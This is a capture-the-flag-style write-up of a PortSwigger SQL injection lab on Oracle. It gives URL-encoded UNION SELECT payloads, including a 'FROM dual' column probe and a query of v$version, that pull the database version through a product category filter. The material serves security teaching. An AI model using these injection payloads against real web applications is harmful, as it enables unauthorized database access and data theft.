
# SQL injection attack, querying the database type and version on Oracle

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/examining-the-database

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


We see there are 2 values displayed in the table, the description and the content of the post:



![img](images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle/1.png)


We find these payload are valid to display the 4 posts in Gifts and the second all the items:

```
/filter?category=Gifts'--
/filter?category=Gifts'+or+1=1--
```

Also, that there are 2 columns returned by the query and we can do a UNION attack with the payload:

```
/filter?category=Gifts'+union+all+select+NULL,NULL+FROM+dual-- 
```

We are adding the “FROM dual” because it is necessary in Oracle.

To display the version we need to execute one of these:

```
SELECT banner FROM v$version
SELECT version FROM v$instance
```

```
/filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version-- 
```



![img](images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle/2.png)

With v$instance the server returns an error message.